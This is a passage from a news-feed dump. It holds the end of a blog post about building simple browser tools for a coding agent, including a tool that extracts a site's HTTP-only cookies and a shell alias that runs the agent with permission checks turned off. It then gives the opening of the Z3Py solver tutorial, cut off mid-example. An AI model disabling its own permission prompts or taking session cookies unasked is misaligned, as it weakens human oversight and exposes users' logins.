<p>If you're having trouble following what this tool does, worry not, I will have a video at the end of the blog post where you can see it in action. Before we look at that, let me show you an additional tool.</p>
<h2 id="toc_9">Adding the Cookies Tool</h2>
<p>During one of my recent scraping adventures, I had a need for HTTP-only cookies of that site, so the deterministic scraper could pretend it's me. The Evaluate JavaScript tool cannot handle this as it executes in the page context. But it took not even a minute for me to instruct Claude to create that tool, add it to the readme, and away we went.</p>
<img src="https://mariozechner.at/posts/2025-11-02-what-if-you-dont-need-mcp/media/extension.png" loading="lazy">

<p>This is so much easier than adjusting, testing, and debugging an existing MCP server.</p>
<h2 id="toc_10">A Contrived Example</h2>
<p>Let me illustrate usage of this set of tools with a contrived example. I set out to build a simple Hacker News scraper where I basically pick the DOM elements for the agent, based on which it can then write a minimal Node.js scraper. Here's how that looks in action. I sped up a few sections where Claude was its usual slow self.</p>
<video src="https://mariozechner.at/posts/2025-11-02-what-if-you-dont-need-mcp/media/scrape.mp4" poster="https://mariozechner.at/posts/2025-11-02-what-if-you-dont-need-mcp/media/scrape-poster.png" controls="">
</video>

<p>Real world scraping tasks would look a bit more involved. Also, there's no point in doing it like this for such a simple site like Hacker News. But you get the idea.</p>
<p>Final token tally:</p>
<img src="https://mariozechner.at/posts/2025-11-02-what-if-you-dont-need-mcp/media/scrape-tokens.png" loading="lazy">

<h2 id="toc_11">Making This Reusable Across Agents</h2>
<p>Here's how I've set things up so I can use this with Claude Code and other agents. I have a folder <code>agent-tools</code> in my home directory. I then clone the repositories of individual tools, like the browser tools repository above, into that folder. Then I set up an alias:</p>
<pre><code><span>alias</span> cl=<span>"PATH=<span>$PATH</span>:/Users/badlogic/agent-tools/browser-tools:&lt;other-tool-dirs&gt; &amp;&amp; claude --dangerously-skip-permissions"</span>
</code></pre><p>This way all of the scripts are available to sessions of Claude, but don't pollute my normal environment. I also prefix each script with the full tool name, e.g. <code>browser-tools-start.js</code>, to eliminate name collisions. I also add a single sentence to the README telling the agent that all the scripts are globally available. This way, the agent doesn't have to change its working directory just to call a tool script, saving a few tokens here and there, and reducing the chances of the agent getting confused by the constant working directory changes.</p>
<p>Finally, I add the agent tools directory as a working directory to Claude Code via <code>/add-dir</code>, so I can use <code>@README.md</code> to reference a specific tool's README file and get it into the agent's context. I prefer this to Anthropic's skill auto-discovery, which I found to not work reliably in practice. It also means I save a few more tokens: Claude Code injects all the frontmatter of all skills it can find into the system prompt (or first user message, I forgot, see <a href="https://cchistory.mariozechner.at/">https://cchistory.mariozechner.at</a>)</p>
<h2 id="toc_12">In Conclusion</h2>
<p>Building these tools is ridiculously easy, gives you all the freedom you need, and makes you, your agent, and your token usage efficient. You can find the browser tools on <a href="https://github.com/badlogic/browser-tools">GitHub</a>.</p>
<p>This general principle can apply to any kind of harness that has some kind of code execution environment. Think outside the MCP box and you'll find that this is much more powerful than the more rigid structure you have to follow with MCP.</p>
<p>With great power comes great responsibility though. You will have to come up with a structure for how you build and maintain those tools yourself. Anthropic's skill system can be one way to do it, though that's less transferable to other agents. Or you follow my setup above.</p>
<p>
    This page respects your privacy by not using cookies or similar technologies and by not collecting any personally identifiable information.
</p>

</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Z3 API in Python: From Sudoku to N-Queens in Under 20 Lines (132 pts)]]></title>
            <link>https://ericpony.github.io/z3py-tutorial/guide-examples.htm</link>
            <guid>45947301</guid>
            <pubDate>Sun, 16 Nov 2025 18:38:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ericpony.github.io/z3py-tutorial/guide-examples.htm">https://ericpony.github.io/z3py-tutorial/guide-examples.htm</a>, See on <a href="https://news.ycombinator.com/item?id=45947301">Hacker News</a></p>
<div id="readability-page-1" class="page">
<h3></h3>

<h2>Z3 API in Python</h2>
<p>Z3 is a high performance theorem prover developed at <a target="_blank" href="http://research.microsoft.com/">Microsoft Research</a>.
Z3 is used in many applications such as: software/hardware verification and testing, constraint solving, analysis of hybrid systems,
security, biology (in silico analysis), and geometrical problems.</p>
<p>This tutorial demonstrates the main capabilities of Z3Py: the Z3 API in <a target="_blank" href="http://www.python.org/">Python</a>.
No Python background is needed to read this tutorial. However, it is useful to learn Python (a fun language!) at some point, and
there are many excellent free resources for doing so (<a target="_blank" href="http://docs.python.org/tutorial/">Python Tutorial</a>).
</p>

<p>The Z3 distribution also contains the <b>C</b>, <b>.Net</b> and <b>OCaml</b> APIs. The source code of Z3Py is available in
the Z3 distribution, feel free to modify it to meet your needs. The source code also demonstrates how to use new features in Z3 4.0.
Other cool front-ends for Z3 include <a target="_blank" href="http://lara.epfl.ch/~psuter/ScalaZ3/">Scala^Z3</a> and <a target="_blank" href="http://hackage.haskell.org/package/sbv">SBV</a>.</p>

<!--<p>
Be sure to follow along with the examples by clicking the <b>load in editor</b> link in the
corner. See what Z3Py says, try your own scripts, and experiment!
</p>-->

<p>
Please send feedback, comments and/or corrections to <a href="mailto:leonardo@microsoft.com">leonardo@microsoft.com</a>.
Your comments are very valuable.
</p>

<h2>Getting Started</h2>

<p>Let us start with the following simple example:</p>

<example pref="z3py.1">
<div><pre><span>x</span> <span>=</span> <span>Int</span><span>(</span><span>'x'</span><span>)</span>
<span>y</span> <span>=</span> <span>Int</span><span>(</span><span>'y'</span><span>)</span>
<span>solve</span><span>(</span><span>x</span> <span>&gt;</span> <span>2</span><span>,</span> <span>y</span> <span>&lt;</span> <span>10</span><span>,</span> <span>x</span> <span>+</span> <span>2</span><span>*</span><span>y</span> <span>==</span> <span>7</span><span>)</span>
</pre></div>
</example>

<p>The function <tt>Int('x')</tt> creates an integer variable in Z3 named <tt>x</tt>.
The <tt>solve</tt> function solves a system of constraints. The example above uses
two variables <tt>x</tt> and <tt>y</tt>, and three constraints.
Z3Py like Python uses <b>=</b> for assignment. The operators <tt>&lt;</tt>,
<tt>&lt;=</tt>,
<tt>&gt;</tt>,
<tt>&gt;=</tt>,
<tt>==</tt> and
<tt>!=</tt> for comparison.
In the example above, the expression <tt>x + 2*y  == 7</tt> is a Z3 constraint.
Z3 can solve and crunch formulas.
</p>

<p>
The next examples show how to use the Z3 formula/expression simplifier.
</p>

<example pref="z3py.2">
<div><pre><span>x</span> <span>=</span> <span>Int</span><span>(</span><span>'x'</span><span>)</span>
<span>y</span> <span>=</span> <span>Int</span><span>(</span><span>'y'</span><span>)</span>
<span>print</span> (<span>simplify</span><span>(</span><span>x</span> <span>+</span> <span>y</span> <span>+</span> <span>2</span><span>*</span><span>x</span> <span>+</span> <span>3</span><span>)</span>)
<span>print</span> (<span>simplify</span><span>(</span><span>x</span> <span>&lt;</span> <span>y</span> <span>+</span> <span>x</span> <span>+</span> <span>2</span><span>)</span>)
<span>print</span> (<span>simplify</span><span>(</span><span>And</span><span>(</span><span>x</span> <span>+</span> <span>1</span> <span>&gt;=</span> <span>3</span><span>,</span> <span>x</span><span>**</span><span>2</span> <span>+</span> <span>x</span><span>**</span><span>2</span> <span>+</span> <span>y</span><span>**</span><span>2</span> <span>+</span> <span>2</span> <span>&gt;=</span> <span>5</span><span>))</span>)
</pre></div>
</example>

<p>
By default, Z3Py (for the web) displays formulas and expressions using mathematical notation.
As usual, <tt>∧</tt> is the logical and, <tt>∨</tt> is the logical or, and so on.
The command <tt>set_option(html_mode=False)</tt> makes all formulas and expressions to be
displayed in Z3Py notation. This is also the default mode for the offline version of Z3Py that
comes with the Z3 distribution.
</p>

<example pref="printer">
<div><pre><span>x</span> <span>=</span> <span>Int</span><span>(</span><span>'x'</span><span>)</span>
<span>y</span> <span>=</span> <span>Int</span><span>(</span><span>'y'</span><span>)</span>
<span>print</span> (<span>x</span><span>**</span><span>2</span> <span>+</span> <span>y</span><span>**</span><span>2</span> <span>&gt;=</span> <span>1</span>)
<span>set_option</span><span>(</span><span>html_mode</span><span>=</span><span>False</span><span>)</span>
<span>print</span> (<span>x</span><span>**</span><span>2</span> <span>+</span> <span>y</span><span>**</span><span>2</span> <span>&gt;=</span> <span>1</span>)
</pre></div>
</example>

<p>
Z3 provides functions for traversing expressions.
</p>

<example pref="z3py.3">
<div><pre><span>x</span> <span>=</span> <span>Int</span><span>(</span><span>'x'</span><span>)</span>
<span>y</span> <span>=</span> <span>Int</span><span>(</span><span>'y'</span><span>)</span>
<span>n</span> <span>=</span> <span>x</span> <span>+</span> <span>y</span> <span>&gt;=</span> <span>3</span>
<span>print</span> (<span>"num args: "</span><span>,</span> <span>n</span><span>.</span><span>num_args</span><span>()</span>)
<span>print</span> (<span>"children: "</span><span>,</span> <span>n</span><span>.</span><span>children</span><span>()</span>)
<span>print</span> (<span>"1st child:"</span><span>,</span> <span>n</span><span>.</span><span>arg</span><span>(</span><span>0</span><span>)</span>)
<span>print</span> (<span>"2nd child:"</span><span>,</span> <span>n</span><span>.</span><span>arg</span><span>(</span><span>1</span><span>)</span>)
<span>print</span> (<span>"operator: "</span><span>,</span> <span>n</span><span>.</span><span>decl</span><span>()</span>)
<span>print</span> (<span>"op name:  "</span><span>,</span> <span>n</span><span>.</span><span>decl</span><span>()</span><span>.</span><span>name</span><span>()</span>)
</pre></div>
</example>

<p>
Z3 provides all basic mathematical operations. Z3Py uses the same operator precedence of the Python language.
Like Python, <tt>**</tt> is the power operator. Z3 can solve nonlinear <i>polynomial</i> constraints.
</p>

<example pref="z3py.4">
<div><pre><span>x</span> <span>=</span> <span>Real</span><span>(</span><span>'x'</span><span>)</span>
<span>y</span> <span>=</span> <span>Real</span><span>(</span><span>'y'</span><span>)</span>
<span>solve</span><span>(</span><span>x</span><span>**</span><span>2</span> <span>+</span> <span>y</span><span>**</span><span>2</span> <span>&gt;</span> <span>3</span><span>,</span> <span>x</span><span>**</span><span>3</span> <span>+</span> <span>y</span> <span>&lt;</span> <span>5</span><span>)</span>
</pre></div>
</example>

<p>
The procedure <tt>Real('x')</tt> creates the real variable <tt>x</tt>.
Z3Py can represent arbitrarily large integers, rational numbers (like in the example above),
and irrational algebraic numbers. An irrational algebraic number is a root of a polynomial with integer coefficients.
Internally, Z3 represents all these numbers precisely.
The irrational numbers are displayed in decimal notation for making it easy to read the results.
</p>

<example pref="z3py.5">
<div><pre><span>x</span> <span>=</span> <span>Real</span><span>(</span><span>'x'</span><span>)</span>
<span>y</span> <span>=</span> <span>Real</span><span>(</span><span>'y'</span><span>)</span>
<span>solve</span><span>(</span><span>x</span><span>**</span><span>2</span> <span>+</span> <span>y</span><span>**</span><span>2</span> <span>==</span> <span>3</span><span>,</span> <span>x</span><span>**</span><span>3</span> <span>==</span> <span>2</span><span>)</span>

<span>set_option</span><span>(</span><span>precision</span><span>=</span><span>30</span><span>)</span>
<span>print</span> (<span>"Solving, and displaying result with 30 decimal places"</span>)
<span>solve</span><span>(</span><span>x</span><span>**</span><span>2</span> <span>+</span> <span>y</span><span>**</span><span>2</span> <span>==</span> <span>3</span><span>,</span> <span>x</span><span>**</span><span>3</span> <span>==</span> <span>2</span><span>)</span>
</pre></div>
</example>

<p>
The procedure <tt>set_option</tt> is used to configure the Z3 environment. It is used to set global configuration options
such as how the result is displayed. The option <tt>set_option(precision=30)</tt> sets the number of decimal places used when displaying results.
The <tt>?</tt> mark in <tt>1.2599210498?</tt> indicates the output is truncated.
</p>

<p>
The following example demonstrates a common mistake. The expression <tt>3/2</tt> is a Python integer and not a Z3 rational number.
The example also shows different ways to create rational numbers in Z3Py. The procedure <tt>Q(num, den)</tt> creates a
Z3 rational where <tt>num</tt> is the numerator and <tt>den</tt> is the denominator. The <tt>RealVal(1)</tt> creates a Z3 real number
representing the number <tt>1</tt>.
</p>

<example pref="z3py.6">
<div><pre><span>print</span> (<span>1</span><span>/</span><span>3</span>)
<span>print</span> (<span>RealVal</span><span>(</span><span>1</span><span>)</span><span>/</span><span>3</span>)
<span>print</span> (<span>Q</span><span>(</span><span>1</span><span>,</span><span>3</span><span>)</span>)

<span>x</span> <span>=</span> <span>Real</span><span>(</span><span>'x'</span><span>)</span>
<span>print</span> (<span>x</span> <span>+</span> <span>1</span><span>/</span><span>3</span>)
<span>print</span> (<span>x</span> <span>+</span> <span>Q</span><span>(</span><span>1</span><span>,</span><span>3</span><span>)</span>)
<span>print</span> (<span>x</span> <span>+</span> <span>"1/3"</span>)
<span>print</span> (<span>x</span> <span>+</span> <span>0.25</span>)
</pre></div>
</example>

<p>
Rational numbers can also be displayed in decimal notation.
</p>

<example pref="z3py.6aa">
<div><pre><span>x</span> <span>=</span> <span>Real</span><span>(</span><span>'x'</span><span>)</span>
<span>solve</span><span>(</span><span>3</span><span>*</span><span>x</span> <span>==</span> <span>1</span><span>)</span>

<span>set_option</span><span>(</span><span>rational_to_decimal</span><span>=</span><span>True</span><span>)</span>
<span>solve</span><span>(</span><span>3</span><span>*</span><span>x</span> <span>==</span> <span>1</span><span>)</span>

<span>set_option</span><span>(</span><span>precision</span><span>=</span><span>30</span><span>)</span>
<span>solve</span><span>(</span><span>3</span><span>*</span><span>x</span> <span>==</span> <span>1</span><span>)</span>
</pre></div>
</example>

<p>
A system of constraints may not have a solution. In this case, we say the system is <b>unsatisfiable</b>.
</p>

<example pref="z3py.6a">
<div><pre><span>x</span> <span>=</span> <span>Real</span><span>(</span><span>'x'</span><span>)</span>
<span>solve</span><span>(</span><span>x</span> <span>&gt;</span> <span>4</span><span>,</span> <span>x</span> <span>&lt;</span> <span>0</span><span>)</span>
</pre></div>
</example>

<p>
Like in Python, comments begin with the hash character <tt>#</tt> and are terminated by the end of line.
Z3Py does not support comments that span more than one line.
</p>

<example pref="comment">
<div><pre><span># This is a comment</span>
<span>x</span> <span>=</span> <span>Real</span><span>(</span><span>'x'</span><span>)</span> <span># comment: creating x</span>
<span>print</span> (<span>x</span><span>**</span><span>2</span> <span>+</span> <span>2</span><span>*</span><span>x</span> <span>+</span> <span>2</span>  <span># comment: printing polynomial</span>)
</pre></div>
</example>

<h2>Boolean Logic</h2>

<p>
Z3 supports Boolean operators: <tt>And</tt>, <tt>Or</tt>, <tt>Not</tt>, <tt>Implies</tt> (implication),
<tt>If</tt> (if-then-else). Bi-implications are represented using equality <tt>==</tt>.
The following example shows how to solve a simple set of Boolean constraints.
</p>

<example pref="z3py.7">
<div><pre><span>p</span> <span>=</span> <span>Bool</span><span>(</span><span>'p'</span><span>)</span>
<span>q</span> <span>=</span> <span>Bool</span><span>(</span><span>'q'</span><span>)</span>
<span>r</span> <span>=</span> <span>Bool</span><span>(</span><span>'r'</span><span>)</span>
<span>solve</span><span>(</span><span>Implies</span><span>(</span><span>p</span><span>,</span> <span>q</span><span>),</span> <span>r</span> <span>==</span> <span>Not</span><span>(</span><span>q</span><span>),</span> <span>Or</span><span>(</span><span>Not</span><span>(</span><span>p</span><span>),</span> <span>r</span><span>))</span>

</pre></div>
</example>

<p>
The Python Boolean constants <tt>True</tt> and <tt>False</tt> can be used to build Z3 Boolean expressions.
</p>

<example pref="z3py.8">
<div><pre><span>p</span> <span>=</span> <span>Bool</span><span>(</span><span>'p'</span><span>)</span>
<span>q</span> <span>=</span> <span>Bool</span><span>(</span><span>'q'</span><span>)</span>
<span>print</span> (<span>And</span><span>(</span><span>p</span><span>,</span> <span>q</span><span>,</span> <span>True</span><span>)</span>)
<span>print</span> (<span>simplify</span><span>(</span><span>And</span><span>(</span><span>p</span><span>,</span> <span>q</span><span>,</span> <span>True</span><span>))</span>)
<span>print</span> (<span>simplify</span><span>(</span><span>And</span><span>(</span><span>p</span><span>,</span> <span>False</span><span>))</span>)
</pre></div>
</example>

<p>The following example uses a combination of polynomial and Boolean constraints.
</p>

<example pref="z3py.9">
<div><pre><span>p</span> <span>=</span> <span>Bool</span><span>(</span><span>'p'</span><span>)</span>
<span>x</span> <span>=</span> <span>Real</span><span>(</span><span>'x'</span><span>)</span>
<span>solve</span><span>(</span><span>Or</span><span>(</span><span>x</span> <span>&lt;</span> <span>5</span><span>,</span> <span>x</span> <span>&gt;</span> <span>10</span><span>),</span> <span>Or</span><span>(</span><span>p</span><span>,</span> <span>x</span><span>**</span><span>2</span> <span>==</span> <span>2</span><span>),</span> <span>Not</span><span>(</span><span>p</span><span>))</span>
</pre></div>
</example>

<h2>Solvers</h2>

<p>Z3 provides different solvers. The command <tt>solve</tt>, used in the previous examples, is implemented using the Z3 solver API.
The implementation can be found in the file <tt>z3.py</tt> in the Z3 distribution.
The following example demonstrates the basic Solver API.
</p>

<example pref="z3py.10">
<div><pre><span>x</span> <span>=</span> <span>Int</span><span>(</span><span>'x'</span><span>)</span>
<span>y</span> <span>=</span> <span>Int</span><span>(</span><span>'y'</span><span>)</span>

<span>s</span> <span>=</span> <span>Solver</span><span>()</span>
<span>print</span> (<span>s</span>)

<span>s</span><span>.</span><span>add</span><span>(</span><span>x</span> <span>&gt;</span> <span>10</span><span>,</span> <span>y</span> <span>==</span> <span>x</span> <span>+</span> <span>2</span><span>)</span>
<span>print</span> (<span>s</span>)
<span>print</span> (<span>"Solving constraints in the solver s ..."</span>)
<span>print</span> (<span>s</span><span>.</span><span>check</span><span>()</span>)

<span>print</span> (<span>"Create a new scope..."</span>)
<span>s</span><span>.</span><span>push</span><span>()</span>
<span>s</span><span>.</span><span>add</span><span>(</span><span>y</span> <span>&lt;</span> <span>11</span><span>)</span>
<span>print</span> (<span>s</span>)
<span>print</span> (<span>"Solving updated set of constraints..."</span>)
<span>print</span> (<span>s</span><span>.</span><span>check</span><span>()</span>)

<span>print</span> (<span>"Restoring state..."</span>)
<span>s</span><span>.</span><span>pop</span><span>()</span>
<span>print</span> (<span>s</span>)
<span>print</span> (<span>"Solving restored set of constraints..."</span>)
<span>print</span> (<span>s</span><span>.</span><span>check</span><span>()</span>)
</pre></div>
</example>

<p>
The command <tt>Solver()</tt> creates a general purpose solver. Constraints can be added using the method <tt>add</tt>.
We say the constraints have been <b>asserted</b> in the solver. The method <tt>check()</tt> solves the asserted constraints.
The result is <tt>sat</tt> (satisfiable) if a solution was found. The result is <tt>unsat</tt> (unsatisfiable) if
no solution exists. We may also say the system of asserted constraints is <b>infeasible</b>. Finally, a solver may fail
to solve a system of constraints and <tt>unknown</tt> is returned.
</p>

<p>
In some applications, we want to explore several similar problems that share several constraints.
We can use the commands <tt>push</tt> and <tt>pop</tt> for doing that.
Each solver maintains a stack of assertions. The command <tt>push</tt> creates a new scope by
saving the current stack size.
The command <tt>pop</tt> removes any assertion performed between it and the matching <tt>push</tt>.
The <tt>check</tt> method always operates on the content of solver assertion stack.
</p>

<p>
The following example shows an example that Z3 cannot solve. The solver returns <tt>unknown</tt> in this case.
Recall that Z3 can solve nonlinear polynomial constraints, but <tt>2**x</tt> is not a polynomial.
</p>

<example pref="z3py.11">
<div><pre><span>x</span> <span>=</span> <span>Real</span><span>(</span><span>'x'</span><span>)</span>
<span>s</span> <span>=</span> <span>Solver</span><span>()</span>
<span>s</span><span>.</span><span>add</span><span>(</span><span>2</span><span>**</span><span>x</span> <span>==</span> <span>3</span><span>)</span>
<span>print</span> (<span>s</span><span>.</span><span>check</span><span>()</span>)
</pre></div>
</example>

<p>
The following example shows how to traverse the constraints asserted into a solver, and how to collect performance statistics for
the <tt>check</tt> method.
</p>

<example pref="z3py.12">
<div><pre><span>x</span> <span>=</span> <span>Real</span><span>(</span><span>'x'</span><span>)</span>
<span>y</span> <span>=</span> <span>Real</span><span>(</span><span>'y'</span><span>)</span>
<span>s</span> <span>=</span> <span>Solver</span><span>()</span>
<span>s</span><span>.</span><span>add</span><span>(</span><span>x</span> <span>&gt;</span> <span>1</span><span>,</span> <span>y</span> <span>&gt;</span> <span>1</span><span>,</span> <span>Or</span><span>(</span><span>x</span> <span>+</span> <span>y</span> <span>&gt;</span> <span>3</span><span>,</span> <span>x</span> <span>-</span> <span>y</span> <span>&lt;</span> <span>2</span><span>))</span>
<span>print</span> (<span>"asserted constraints..."</span>)
<span>for</span> <span>c</span> <span>in</span> <span>s</span><span>.</span><span>assertions</span><span>():</span>
    <span>print</span> (<span>c</span>)

<span>print</span> (<span>s</span><span>.</span><span>check</span><span>()</span>)
<span>print</span> (<span>"statistics for the last check method..."</span>)
<span>print</span> (<span>s</span><span>.</span><span>statistics</span><span>()</span>)
<span># Traversing statistics</span>
<span>for</span> <span>k</span><span>,</span> <span>v</span> <span>in</span> <span>s</span><span>.</span><span>statistics</span><span>():</span>
    <span>print</span> (<span>"</span><span>%s</span><span> : </span><span>%s</span><span>"</span> <span>%</span> <span>(</span><span>k</span><span>,</span> <span>v</span><span>)</span>)
</pre></div>
</example>

<p>
The command <tt>check</tt> returns <tt>sat</tt> when Z3 finds a solution for the set of asserted constraints.
We say Z3 <b>satisfied</b> the set of constraints. We say the solution is a <b>model</b> for the set of asserted
constraints. A model is an <b>interpretation</b> that makes each asserted constraint <b>true</b>.
The following example shows the basic methods for inspecting models.
</p>

<example pref="z3py.13">
<div><pre><span>x</span><span>,</span> <span>y</span><span>,</span> <span>z</span> <span>=</span> <span>Reals</span><span>(</span><span>'x y z'</span><span>)</span>
<span>s</span> <span>=</span> <span>Solver</span><span>()</span>
<span>s</span><span>.</span><span>add</span><span>(</span><span>x</span> <span>&gt;</span> <span>1</span><span>,</span> <span>y</span> <span>&gt;</span> <span>1</span><span>,</span> <span>x</span> <span>+</span> <span>y</span> <span>&gt;</span> <span>3</span><span>,</span> <span>z</span> <span>-</span> <span>x</span> <span>&lt;</span> <span>10</span><span>)</span>
<span>print</span> (<span>s</span><span>.</span><span>check</span><span>()</span>)

<span>m</span> <span>=</span> <span>s</span><span>.</span><span>model</span><span>()</span>
<span>print</span> (<span>"x = </span><span>%s</span><span>"</span> <span>%</span> <span>m</span><span>[</span><span>x</span><span>]</span>)

<span>print</span> (<span>"traversing model..."</span>)
<span>for</span> <span>d</span> <span>in</span> <span>m</span><span>.</span><span>decls</span><span>():</span>
    <span>print</span> (<span>"</span><span>%s</span><span> = </span><span>%s</span><span>"</span> <span>%</span> <span>(</span><span>d</span><span>.</span><span>name</span><span>(),</span> <span>m</span><span>[</span><span>d</span><span>])</span>)
</pre></div>
</example>

<p>In the example above, the function <tt>Reals('x y z')</tt> creates the variables. <tt>x</tt>, <tt>y</tt> and <tt>z</tt>.
It is shorthand for:
</p>

<pre>x = Real('x')
y = Real('y')
z = Real('z')
</pre>

<p>
The expression <tt>m[x]</tt> returns the interpretation of <tt>x</tt> in the model <tt>m</tt>.
The expression <tt>"%s = %s" % (d.name(), m[d])</tt> returns a string where the first <tt>%s</tt> is replaced with
the name of <tt>d</tt> (i.e., <tt>d.name()</tt>), and the second <tt>%s</tt> with a textual representation of the
interpretation of <tt>d</tt> (i.e., <tt>m[d]</tt>). Z3Py automatically converts Z3 objects into a textual representation
when needed.
</p>

<h2>Arithmetic</h2>

<p>Z3 supports real and integer variables. They can be mixed in a single problem.
Like most programming languages, Z3Py will automatically add coercions converting integer expressions to real ones when needed.
The following example demonstrates different ways to declare integer and real variables.
</p>

<example pref="arith.1">
<div><pre><span>x</span> <span>=</span> <span>Real</span><span>(</span><span>'x'</span><span>)</span>
<span>y</span> <span>=</span> <span>Int</span><span>(</span><span>'y'</span><span>)</span>
<span>a</span><span>,</span> <span>b</span><span>,</span> <span>c</span> <span>=</span> <span>Reals</span><span>(</span><span>'a b c'</span><span>)</span>
<span>s</span><span>,</span> <span>r</span> <span>=</span> <span>Ints</span><span>(</span><span>'s r'</span><span>)</span>
<span>print</span> (<span>x</span> <span>+</span> <span>y</span> <span>+</span> <span>1</span> <span>+</span> <span>(</span><span>a</span> <span>+</span> <span>s</span><span>)</span>)
<span>print</span> (<span>ToReal</span><span>(</span><span>y</span><span>)</span> <span>+</span> <span>c</span>)
</pre></div>
</example>

<p>The function <tt>ToReal</tt> casts an integer expression into a real expression.</p>

<p>Z3Py supports all basic arithmetic operations.</p>

<example pref="arith.2">
<div><pre><span>a</span><span>,</span> <span>b</span><span>,</span> <span>c</span> <span>=</span> <span>Ints</span><span>(</span><span>'a b c'</span><span>)</span>
<span>d</span><span>,</span> <span>e</span> <span>=</span> <span>Reals</span><span>(</span><span>'d e'</span><span>)</span>
<span>solve</span><span>(</span><span>a</span> <span>&gt;</span> <span>b</span> <span>+</span> <span>2</span><span>,</span>
      <span>a</span> <span>==</span> <span>2</span><span>*</span><span>c</span> <span>+</span> <span>10</span><span>,</span>
      <span>c</span> <span>+</span> <span>b</span> <span>&lt;=</span> <span>1000</span><span>,</span>
      <span>d</span> <span>&gt;=</span> <span>e</span><span>)</span>
</pre></div>
</example>

<p>The command <tt>simplify</tt> applies simple transformations on Z3 expressions.</p>

<example pref="arith.3">
<div><pre><span>x</span><span>,</span> <span>y</span> <span>=</span> <span>Reals</span><span>(</span><span>'x y'</span><span>)</span>
<span># Put expression in sum-of-monomials form</span>
<span>t</span> <span>=</span> <span>simplify</span><span>((</span><span>x</span> <span>+</span> <span>y</span><span>)</span><span>**</span><span>3</span><span>,</span> <span>som</span><span>=</span><span>True</span><span>)</span>
<span>print</span> (<span>t</span>)
<span># Use power operator</span>
<span>t</span> <span>=</span> <span>simplify</span><span>(</span><span>t</span><span>,</span> <span>mul_to_power</span><span>=</span><span>True</span><span>)</span>
<span>print</span> (<span>t</span>)
</pre></div>
</example>

<p>The command <tt>help_simplify()</tt> prints all available options.
Z3Py allows users to write option in two styles. The Z3 internal option names start with <tt>:</tt> and words are separated by <tt>-</tt>.
These options can be used in Z3Py. Z3Py also supports Python-like names,
where <tt>:</tt> is suppressed and <tt>-</tt> is replaced with <tt>_</tt>.
The following example demonstrates how to use both styles.
</p>

<example pref="arith.4">
<div><pre><span>x</span><span>,</span> <span>y</span> <span>=</span> <span>Reals</span><span>(</span><span>'x y'</span><span>)</span>
<span># Using Z3 native option names</span>
<span>print</span> (<span>simplify</span><span>(</span><span>x</span> <span>==</span> <span>y</span> <span>+</span> <span>2</span><span>,</span> <span>':arith-lhs'</span><span>,</span> <span>True</span><span>)</span>)
<span># Using Z3Py option names</span>
<span>print</span> (<span>simplify</span><span>(</span><span>x</span> <span>==</span> <span>y</span> <span>+</span> <span>2</span><span>,</span> <span>arith_lhs</span><span>=</span><span>True</span><span>)</span>)

<span>print</span> (<span>"</span><span>\n</span><span>All available options:"</span>)
<span>help_simplify</span><span>()</span>
</pre></div>
</example>

<p>Z3Py supports arbitrarily large numbers. The following example demonstrates how to perform basic arithmetic using larger integer, rational and irrational numbers.
Z3Py only supports <a target="”_blank”" href="http://en.wikipedia.org/wiki/Algebraic_number">algebraic irrational numbers</a>. Algebraic irrational numbers are sufficient for presenting the solutions of systems of polynomial constraints.
Z3Py will always display irrational numbers in decimal notation since it  is more convenient to read. The internal representation can be extracted using the method <tt>sexpr()</tt>.
It displays Z3 internal representation for mathematical formulas and expressions in <a target="_blank" href="http://en.wikipedia.org/wiki/S-expression">s-expression</a> (Lisp-like) notation.
</p>

<example pref="arith.5">
<div><pre><span>x</span><span>,</span> <span>y</span> <span>=</span> <span>Reals</span><span>(</span><span>'x y'</span><span>)</span>
<span>solve</span><span>(</span><span>x</span> <span>+</span> <span>10000000000000000000000</span> <span>==</span> <span>y</span><span>,</span> <span>y</span> <span>&gt;</span> <span>20000000000000000</span><span>)</span>

<span>print</span> (<span>Sqrt</span><span>(</span><span>2</span><span>)</span> <span>+</span> <span>Sqrt</span><span>(</span><span>3</span><span>)</span>)
<span>print</span> (<span>simplify</span><span>(</span><span>Sqrt</span><span>(</span><span>2</span><span>)</span> <span>+</span> <span>Sqrt</span><span>(</span><span>3</span><span>))</span>)
<span>print</span> (<span>simplify</span><span>(</span><span>Sqrt</span><span>(</span><span>2</span><span>)</span> <span>+</span> <span>Sqrt</span><span>(</span><span>3</span><span>))</span><span>.</span><span>sexpr</span><span>()</span>)
<span># The sexpr() method is available for any Z3 expression</span>
<span>print</span> (<span>(</span><span>x</span> <span>+</span> <span>Sqrt</span><span>(</span><span>y</span><span>)</span> <span>*</span> <span>2</span><span>)</span><span>.</span><span>sexpr</span><span>()</span>)
</pre></div>
</example>

<h2>Machine Arithmetic</h2>

<p>
Modern CPUs and main-stream programming languages use
arithmetic over fixed-size bit-vectors.
Machine arithmetic is available in Z3Py as <i>Bit-Vectors</i>.
They implement the
precise semantics of unsigned and of
signed <a target="_blank" href="http://en.wikipedia.org/wiki/Two's_complement">two-complements arithmetic</a>.

</p>
<p>
The following example demonstrates how to create bit-vector variables and constants.
The function <tt>BitVec('x', 16)</tt> creates a bit-vector variable in Z3 named <tt>x</tt> with <tt>16</tt> bits.
For convenience, integer constants can be used to create bit-vector expressions in Z3Py.
The function <tt>BitVecVal(10, 32)</tt> creates a bit-vector of size <tt>32</tt> containing the value <tt>10</tt>.
</p>

<example pref="bitvec.1">
<div><pre><span>x</span> <span>=</span> <span>BitVec</span><span>(</span><span>'x'</span><span>,</span> <span>16</span><span>)</span>
<span>y</span> <span>=</span> <span>BitVec</span><span>(</span><span>'y'</span><span>,</span> <span>16</span><span>)</span>
<span>print</span> (<span>x</span> <span>+</span> <span>2</span>)
<span># Internal representation</span>
<span>print</span> (<span>(</span><span>x</span> <span>+</span> <span>2</span><span>)</span><span>.</span><span>sexpr</span><span>()</span>)

<span># -1 is equal to 65535 for 16-bit integers </span>
<span>print</span> (<span>simplify</span><span>(</span><span>x</span> <span>+</span> <span>y</span> <span>-</span> <span>1</span><span>)</span>)

<span># Creating bit-vector constants</span>
<span>a</span> <span>=</span> <span>BitVecVal</span><span>(</span><span>-</span><span>1</span><span>,</span> <span>16</span><span>)</span>
<span>b</span> <span>=</span> <span>BitVecVal</span><span>(</span><span>65535</span><span>,</span> <span>16</span><span>)</span>
<span>print</span> (<span>simplify</span><span>(</span><span>a</span> <span>==</span> <span>b</span><span>)</span>)

<span>a</span> <span>=</span> <span>BitVecVal</span><span>(</span><span>-</span><span>1</span><span>,</span> <span>32</span><span>)</span>
